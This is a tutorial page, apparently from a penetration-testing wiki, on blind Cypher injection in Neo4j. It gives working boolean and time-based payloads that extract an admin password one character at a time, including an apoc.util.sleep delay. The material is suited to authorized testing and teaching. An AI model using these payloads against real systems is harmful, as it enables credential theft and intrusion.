---
title: "Blind Cypher injection: boolean and time-based inference in Neo4j"
description: "Recover data through a Neo4j Cypher injection that returns no rows, using conditional patterns and apoc.util.sleep() for boolean and time-based inference."
keywords:
  - blind Cypher injection
  - boolean-based inference
  - time-based injection
  - apoc.util.sleep
  - Neo4j blind extraction
  - conditional MATCH
---

# Blind injection

When an injection point returns no rows to the attacker, data is recovered one bit at a time by making the query's behavior depend on a condition and observing the difference. This is the Cypher analogue of blind SQL injection: the response does not carry the data, but it does carry a signal (a changed result, a different status, or a delay) that answers a yes/no question.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Boolean-based inference

Make a pattern match (hit) or fail to match (no hit) depending on the condition under test. The application's two observable states (a row returned versus none, HTTP 200 versus empty, "found" versus "not found") become the oracle.

A true and a false probe to calibrate the two responses:

```
' OR 1=1 //
' OR 1=2 //
```

Once the two states are distinguishable, test a fact and read the answer from which state you get:

```
' OR EXISTS { MATCH (u:User {name:'admin'}) } //
' OR size([ (a:Admin) | a ]) > 0 //
```

Extract a value character by character with `substring` and comparison. Each request confirms one character, then you move to the next position:

```
' OR substring(head([ (u:User {name:'admin'}) | u.password ]),0,1) = 'a' //
' OR substring(head([ (u:User {name:'admin'}) | u.password ]),0,1) < 'm' //
```

Compare the single-character substring **lexicographically** with `>` and `<` (string comparison, not numeric: `toInteger('a')` returns null). That drives a binary search over the character set, cutting the request count per character to a handful. `size()` on a comprehension yields counts (how many users, how long a property is) that guide the walk:

```
' OR size(head([ (u:User {name:'admin'}) | u.password ])) = 12 //
```

## Time-based inference

Where both responses look identical, make the condition control how long the query runs. The portable approach forces expensive computation on the true branch only, so a true condition answers measurably slower:

```
' OR CASE WHEN substring(head([ (u:User {name:'admin'}) | u.password ]),0,1)='a'
     THEN size([ x IN range(1,5000000) | x ]) ELSE 0 END > -1 //
```

`CASE WHEN ... THEN ... ELSE ... END` is Cypher's conditional, and only the true branch builds the five-million-element list, so it runs far slower than the trivial branch. This needs no extensions.

Where APOC is present, `apoc.util.sleep()` gives a cleaner fixed delay, but it is a **procedure**: it must be invoked with `CALL` and cannot be returned from a `CASE` expression. Gate it with a conditional `CALL` in a subquery so only the matching case sleeps:

```
' OR EXISTS { MATCH (u:User {name:'admin'}) WHERE substring(u.password,0,1)='a' CALL apoc.util.sleep(3000) RETURN 1 } //
```

## Driving it

Blind extraction is request-heavy, so script it: one request per character per guess for naive boolean, far fewer with binary search or timing. Confirm the two baseline states first, keep the delay well above network jitter (seconds, not milliseconds) for time-based probes, and repeat timing measurements to filter noise. Combine with [Data extraction](data-extraction.md) techniques to first enumerate labels and property keys, so the blind phase targets known fields instead of guessing names.

## References

- [APOC: apoc.util.sleep](https://neo4j.com/labs/apoc/current/overview/apoc.util/apoc.util.sleep/)
- [Neo4j: Cypher CASE expression](https://neo4j.com/docs/cypher-manual/current/queries/case/)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
